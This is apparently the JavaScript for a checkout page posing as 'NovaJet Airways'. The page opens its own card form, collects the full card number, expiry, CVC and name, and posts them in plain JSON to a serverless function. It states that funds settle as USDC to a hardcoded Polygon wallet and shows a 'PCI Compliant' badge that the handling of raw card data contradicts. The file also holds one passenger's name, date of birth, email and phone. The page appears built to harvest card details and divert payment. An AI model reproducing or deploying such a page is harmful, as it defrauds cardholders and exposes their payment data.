// ========== NOVAJET AIRWAYS - DIRECT CREDIT CARD FORM ==========
const USDC_POLYGON_WALLET = "0xeABA510c0F7286B894A7C9229F41dC1ee0e8038E";

let smsActive = false;
let BASE_PRICE = 1675.00;
const SMS_COST = 9.99;

let passengerName = "MAGNET CARTER";
let passengerDOB = "November 5, 1991";
let contactEmail = "magnet.carter@novajet.com";
let contactPhone = "+1 (425) 788-2234";

// DOM elements
const totalSpan = document.getElementById("dynamicTotalPrice");
const smsBtn = document.getElementById("toggleSmsBtn");
const initiateBtn = document.getElementById("initiatePaymentBtn");
const processingModal = document.getElementById("processingModal");

const emailSpan = document.getElementById("contactEmailDisplay");
const phoneSpan = document.getElementById("contactPhoneDisplay");
const passengerNameSpan = document.getElementById("passengerNameDisplay");
const passengerDobSpan = document.getElementById("passengerDobDisplay");
const seatLabelSpan = document.getElementById("seat1Label");

// Custom edit modal
let currentEditCallback = null;
const editModal = document.getElementById("customEditModal");
const editInput = document.getElementById("editModalInput");
const editModalTitle = document.getElementById("editModalTitle");

function openCustomEditor(title, currentValue, onSave) {
    editModalTitle.innerText = title;
    editInput.value = currentValue;
    editModal.style.display = "flex";
    currentEditCallback = (newValue) => {
        if (newValue && newValue.trim()) {
            onSave(newValue.trim());
        }
        editModal.style.display = "none";
        currentEditCallback = null;
    };
}

document.getElementById("editModalSave").onclick = () => {
    if (currentEditCallback) currentEditCallback(editInput.value);
    else editModal.style.display = "none";
};
document.getElementById("editModalCancel").onclick = () => {
    editModal.style.display = "none";
    currentEditCallback = null;
};

emailSpan.onclick = () => {
    openCustomEditor("Edit email address", contactEmail, (val) => { contactEmail = val; emailSpan.innerText = val; });
};
phoneSpan.onclick = () => {
    openCustomEditor("Edit phone number", contactPhone, (val) => { contactPhone = val; phoneSpan.innerText = val; });
};

document.getElementById("editPassengerBtn").onclick = () => {
    openCustomEditor("Edit full name", passengerName, (newName) => {
        passengerName = newName;
        passengerNameSpan.innerText = passengerName;
        seatLabelSpan.innerText = `${passengerName} - 14K (Window)`;
        setTimeout(() => {
            openCustomEditor("Edit date of birth", passengerDOB, (newDob) => {
                passengerDOB = newDob;
                passengerDobSpan.innerText = passengerDOB;
            });
        }, 100);
    });
};

// Full itinerary viewer
document.getElementById("viewFullItin").onclick = () => {
    const itineraryText = `✈️ NOVAJET COMPLETE SCHEDULE\n\n━━━━━━━━━━━━━━━━━━━━━━\n🇺🇸→🇮🇸 LEG 1: Seattle (SEA) to Reykjavík (KEF)\n📅 May 13, 2025\n🕑 Depart: 2:30 PM | Arrive: 5:10 AM (+1 day)\n⏱️ Duration: 7h 40m | ✈️ Flight NX720\n💺 Seat: 14K (Window)\n\n━━━━━━━━━━━━━━━━━━━━━━\n🇮🇸→🇲🇽 LEG 2: Keflavík (KEF) to Cancún (CUN)\n📅 May 17, 2025\n🕗 Depart KEF: 8:45 AM → Arrive YYZ: 11:20 AM\n🕐 Depart YYZ: 1:10 PM → Arrive CUN: 4:25 PM\n⏱️ Total: 12h 40m | ✈️ Flight NX845 + NX846\n\n━━━━━━━━━━━━━━━━━━━━━━\n🇲🇽→🇮🇸 RETURN: Cancún → Keflavík\n📅 May 24, 2025 | ⏱️ 9h 15m (direct)\n\n🇮🇸→🇺🇸 RETURN: Keflavík → Seattle\n📅 May 28, 2025 | ⏱️ 7h 50m\n\n✅ 2 checked bags • NovaProtect coverage • Meals included`;
    
    const modalDiv = document.createElement("div");
    modalDiv.style.cssText = "position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); backdrop-filter:blur(5px); z-index:3000; display:flex; align-items:center; justify-content:center;";
    modalDiv.innerHTML = `<div style="background:white; border-radius:48px; max-width:500px; width:90%; padding:32px; max-height:80vh; overflow:auto;"><h3 style="margin-bottom:16px;">✈️ Flight Schedule</h3><pre style="white-space:pre-wrap; font-family:'Plus Jakarta Sans'; font-size:0.9rem; line-height:1.5;">${itineraryText}</pre><button id="closeItinModal" style="margin-top:20px; padding:12px 28px; border-radius:40px; background:#1e4a6e; color:white; border:none; cursor:pointer;">Close</button></div>`;
    document.body.appendChild(modalDiv);
    document.getElementById("closeItinModal").onclick = () => modalDiv.remove();
    modalDiv.onclick = (e) => { if(e.target === modalDiv) modalDiv.remove(); };
};

function updateTotal() {
    let total = BASE_PRICE;
    if (smsActive) total += SMS_COST;
    totalSpan.innerText = `$${total.toFixed(2)}`;
    if (smsBtn) {
        smsBtn.innerText = smsActive ? "✓ Added" : "Add $9.99";
        smsBtn.classList.toggle("active", smsActive);
        smsBtn.style.background = smsActive ? "#2a7a5e" : "#1e4a6e";
    }
}
smsBtn.onclick = () => { smsActive = !smsActive; updateTotal(); };

// ========== SHOW CREDIT CARD PAYMENT FORM ==========
function showCreditCardForm(amount, orderId) {
    const modalDiv = document.createElement("div");
    modalDiv.style.cssText = "position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); backdrop-filter:blur(10px); z-index:6000; display:flex; align-items:center; justify-content:center; overflow-y:auto;";
    modalDiv.innerHTML = `
        <div style="background:white; border-radius:48px; max-width:550px; width:90%; padding:32px; max-height:90vh; overflow-y:auto;">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
                <h2 style="color:#1e4a6e; margin:0;">💳 Credit Card Payment</h2>
                <button id="closeCardForm" style="background:none; border:none; font-size:24px; cursor:pointer;">&times;</button>
            </div>
            
            <p style="color:#666; margin-bottom:20px;">Enter your card details to complete payment. Funds will settle as USDC to:</p>
            <div style="background:#f0f6fa; border-radius:20px; padding:10px; margin-bottom:20px; font-family:monospace; font-size:0.7rem; text-align:center; word-break:break-all;">
                ${USDC_POLYGON_WALLET}
            </div>
            
            <form id="cardPaymentForm">
                <div style="margin-bottom:20px;">
                    <label style="display:block; font-weight:600; margin-bottom:8px;">Card Number</label>
                    <input type="text" id="cardNumber" class="card-input" placeholder="4242 4242 4242 4242" maxlength="19" required>
                </div>
                
                <div style="display:flex; gap:15px; margin-bottom:20px;">
                    <div style="flex:1;">
                        <label style="display:block; font-weight:600; margin-bottom:8px;">Expiry Date</label>
                        <input type="text" id="cardExpiry" class="card-input" placeholder="MM/YY" maxlength="5" required>
                    </div>
                    <div style="flex:1;">
                        <label style="display:block; font-weight:600; margin-bottom:8px;">CVC</label>
                        <input type="text" id="cardCvc" class="card-input" placeholder="123" maxlength="4" required>
                    </div>
                </div>
                
                <div style="margin-bottom:25px;">
                    <label style="display:block; font-weight:600; margin-bottom:8px;">Cardholder Name</label>
                    <input type="text" id="cardName" class="card-input" placeholder="${passengerName}" required>
                </div>
                
                <div style="background:#e8f3e8; border-radius:20px; padding:15px; margin-bottom:25px;">
                    <div style="display:flex; justify-content:space-between;">
                        <span>Total Amount:</span>
                        <strong style="font-size:1.2rem;">$${amount.toFixed(2)} USD</strong>
                    </div>
                    <div style="font-size:0.7rem; margin-top:8px;">✨ Settles as USDC (Polygon) to your wallet</div>
                </div>
                
                <button type="submit" style="background:#1e4a6e; color:white; border:none; padding:16px; border-radius:50px; font-weight:700; font-size:1rem; cursor:pointer; width:100%;">
                    Pay $${amount.toFixed(2)} Now
                </button>
            </form>
            
            <p style="text-align:center; font-size:0.7rem; color:#999; margin-top:15px;">
                🔒 PCI Compliant • Cards accepted: Visa, Mastercard, Amex, Discover
            </p>
        </div>
    `;
    document.body.appendChild(modalDiv);
    
    // Format card number
    const cardNumberInput = document.getElementById("cardNumber");
    cardNumberInput.addEventListener("input", function(e) {
        let value = e.target.value.replace(/\D/g, "");
        if (value.length > 16) value = value.slice(0, 16);
        let formatted = value.replace(/(\d{4})/g, "$1 ").trim();
        e.target.value = formatted;
    });
    
    // Format expiry
    const expiryInput = document.getElementById("cardExpiry");
    expiryInput.addEventListener("input", function(e) {
        let value = e.target.value.replace(/\D/g, "");
        if (value.length >= 2) {
            value = value.slice(0, 2) + "/" + value.slice(2, 4);
        }
        e.target.value = value;
    });
    
    // Handle form submission
    const form = document.getElementById("cardPaymentForm");
    form.onsubmit = async (e) => {
        e.preventDefault();
        await processCardPayment(amount, orderId);
    };
    
    document.getElementById("closeCardForm").onclick = () => {
        modalDiv.remove();
    };
}

async function processCardPayment(amount, orderId) {
    const cardNumber = document.getElementById("cardNumber").value.replace(/\s/g, "");
    const cardExpiry = document.getElementById("cardExpiry").value;
    const cardCvc = document.getElementById("cardCvc").value;
    const cardName = document.getElementById("cardName").value;
    
    // Basic validation
    if (!cardNumber || cardNumber.length < 15) {
        alert("Please enter a valid card number");
        return;
    }
    if (!cardExpiry || cardExpiry.length < 5) {
        alert("Please enter valid expiry date (MM/YY)");
        return;
    }
    if (!cardCvc || cardCvc.length < 3) {
        alert("Please enter valid CVC");
        return;
    }
    if (!cardName) {
        alert("Please enter cardholder name");
        return;
    }
    
    // Close the card form
    document.querySelector("#cardPaymentForm").closest("div[style*='position:fixed']")?.remove();
    
    // Show processing
    processingModal.classList.add("active");
    
    try {
        // Send to PayGate.to via serverless function
        const response = await fetch('/.netlify/functions/create-payment', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                amount: amount,
                order_id: orderId,
                customer_name: passengerName,
                customer_email: contactEmail,
                customer_phone: contactPhone,
                card_number: cardNumber,
                card_expiry: cardExpiry,
                card_cvc: cardCvc,
                card_name: cardName
            })
        });
        
        const data = await response.json();
        processingModal.classList.remove("active");
        
        if (data.payment_url) {
            // Redirect to PayGate.to secure payment page
            window.location.href = data.payment_url;
        } else if (data.redirect_url) {
            window.location.href = data.redirect_url;
        } else {
            // If PayGate.to is not working, show manual instructions
            showManualInstructions(amount, orderId);
        }
        
    } catch (error) {
        processingModal.classList.remove("active");
        console.error("Payment error:", error);
        showManualInstructions(amount, orderId);
    }
}

function showManualInstructions(amount, orderId) {
    const modalDiv = document.createElement("div");
    modalDiv.style.cssText = "position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); backdrop-filter:blur(8px); z-index:6000; display:flex; align-items:center; justify-content:center;";
    modalDiv.innerHTML = `
        <div style="background:white; border-radius:48px; max-width:500px; width:90%; padding:32px; text-align:center;">
            <div style="font-size:3rem;">💳</div>
            <h2 style="margin:16px 0;">Redirecting to Secure Payment</h2>
            <p>You will be redirected to PayGate.to's secure payment page to enter your card details.</p>
            <div style="background:#f0f6fa; border-radius:20px; padding:15px; margin:20px 0; text-align:left;">
                <div><strong>📋 Order:</strong> ${orderId}</div>
                <div><strong>💰 Amount:</strong> $${amount.toFixed(2)}</div>
                <div><strong>👤 Passenger:</strong> ${passengerName}</div>
            </div>
            <button id="redirectBtn" style="background:#1e4a6e; color:white; border:none; padding:14px 28px; border-radius:50px; font-weight:600; cursor:pointer; width:100%;">Continue to Payment →</button>
            <button id="closeManualBtn" style="background:#eef3fc; color:#666; border:none; padding:12px 24px; border-radius:40px; font-weight:600; cursor:pointer; margin-top:12px; width:100%;">Cancel</button>
        </div>
    `;
    document.body.appendChild(modalDiv);
    
    document.getElementById("redirectBtn").onclick = async () => {
        modalDiv.remove();
        processingModal.classList.add("active");
        
        try {
            const response = await fetch('/.netlify/functions/create-payment', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    amount: amount,
                    order_id: orderId,
                    customer_name: passengerName,
                    customer_email: contactEmail,
                    customer_phone: contactPhone
                })
            });
            const data = await response.json();
            processingModal.classList.remove("active");
            if (data.payment_url) {
                window.location.href = data.payment_url;
            }
        } catch (err) {
            processingModal.classList.remove("active");
            alert("Payment gateway temporarily unavailable. Please try again later.");
        }
    };
    
    document.getElementById("closeManualBtn").onclick = () => modalDiv.remove();
}

async function initiatePayment() {
    const totalAmount = BASE_PRICE + (smsActive ? SMS_COST : 0);
    const orderId = `NOVA-${Date.now()}-${Math.random().toString(36).substr(2, 8).toUpperCase()}`;
    
    sessionStorage.setItem("nova_booking", JSON.stringify({
        orderId, amount: totalAmount, passengerName, email: contactEmail
    }));
    
    // Show credit card form directly
    showCreditCardForm(totalAmount, orderId);
}

document.getElementById("cancelProcessingBtn").onclick = () => {
    processingModal.classList.remove("active");
};

initiateBtn.onclick = initiatePayment;

function checkPaymentReturn() {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('payment') === 'success') {
        const orderId = urlParams.get('order_id');
        const stored = sessionStorage.getItem("nova_booking");
        if (stored) {
            const booking = JSON.parse(stored);
            showSuccessModal(booking.amount, booking.orderId);
            sessionStorage.removeItem("nova_booking");
            window.history.replaceState({}, document.title, window.location.pathname);
        }
    } else if (urlParams.get('payment') === 'cancelled') {
        alert("Payment was cancelled. You can try again.");
        window.history.replaceState({}, document.title, window.location.pathname);
    }
}

function showSuccessModal(amount, orderId) {
    const ref = `NJ-${Math.floor(10000 + Math.random() * 90000)}`;
    const successDiv = document.createElement("div");
    successDiv.style.cssText = "position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); backdrop-filter:blur(8px); z-index:5000; display:flex; align-items:center; justify-content:center;";
    successDiv.innerHTML = `
        <div style="background:white; border-radius:56px; max-width:500px; width:90%; padding:36px; text-align:center;">
            <div style="font-size:3.5rem;">✅</div>
            <h2 style="margin:12px 0; color:#1e4a6e;">Payment Successful!</h2>
            <p><strong>${passengerName}</strong><br>Washington → Iceland → Mexico</p>
            <div style="background:#f4f9fe; border-radius:32px; padding:18px; margin:20px 0; text-align:left;">
                <div><strong>🎫 Booking Ref:</strong> ${ref}</div>
                <div><strong>💰 Amount:</strong> $${amount.toFixed(2)}</div>
                <div><strong>📧 Confirmation:</strong> ${contactEmail}</div>
                <div style="margin-top:12px; padding-top:12px; border-top:1px solid #ddd;">
                    <strong>💰 Settlement (USDC Polygon):</strong><br>
                    <span style="font-family:monospace; font-size:0.7rem;">${USDC_POLYGON_WALLET}</span>
                </div>
            </div>
            <button id="closeSuccessBtn" style="background:#1e4a6e; color:white; border:none; padding:14px 32px; border-radius:50px; font-weight:600; cursor:pointer;">View My Trip</button>
        </div>
    `;
    document.body.appendChild(successDiv);
    document.getElementById("closeSuccessBtn").onclick = () => successDiv.remove();
}

function googleTranslateElementInit() {
    if (typeof google !== 'undefined' && google.translate) {
        new google.translate.TranslateElement({ 
            pageLanguage: 'en', 
            includedLanguages: 'en,es,fr,de,is,it,pt,zh-CN,ja',
            layout: google.translate.TranslateElement.InlineLayout.SIMPLE 
        }, 'google_translate_element');
    }
}
window.googleTranslateElementInit = googleTranslateElementInit;

checkPaymentReturn();
updateTotal();
console.log('NovaJet Ready | Wallet:', USDC_POLYGON_WALLET);